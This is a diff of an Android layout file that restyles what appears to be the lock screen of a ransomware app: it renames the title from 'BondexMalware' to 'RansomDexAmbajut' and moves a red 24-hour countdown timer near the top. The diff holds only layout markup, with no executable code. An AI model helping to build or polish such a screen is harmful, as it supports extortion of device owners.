@@ -10,12 +10,26 @@
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="BondexMalware"
+        android:text="RansomDexAmbajut"
         android:textColor="#00FF41"
-        android:textSize="42sp"
+        android:textSize="40sp"
         android:textStyle="bold"
         android:shadowColor="#00FF41"
         android:shadowRadius="20" />
+
+    <TextView
+        android:id="@+id/v_timer"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="10dp"
+        android:layout_marginBottom="10dp"
+        android:fontFamily="monospace"
+        android:shadowColor="#FF4444"
+        android:shadowRadius="20"
+        android:text="24:00:00"
+        android:textColor="#FF0000"
+        android:textSize="38sp"
+        android:textStyle="bold" />
 
     <TextView
         android:layout_width="wrap_content"
@@ -28,23 +42,10 @@
         android:shadowRadius="15" />
 
     <TextView
-        android:id="@+id/v_timer"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_marginTop="15dp"
-        android:text="24:00:00"
-        android:textColor="#FF0000"
-        android:textSize="38sp"
-        android:textStyle="bold"
-        android:fontFamily="monospace"
-        android:shadowColor="#FF4444"
-        android:shadowRadius="20" />
-
-    <TextView
         android:id="@+id/v_display"
         android:layout_width="380dp"
         android:layout_height="74dp"
-        android:layout_marginTop="30dp"
+        android:layout_marginTop="20dp"
         android:background="@drawable/input_glow"
         android:elevation="10dp"
         android:gravity="center"
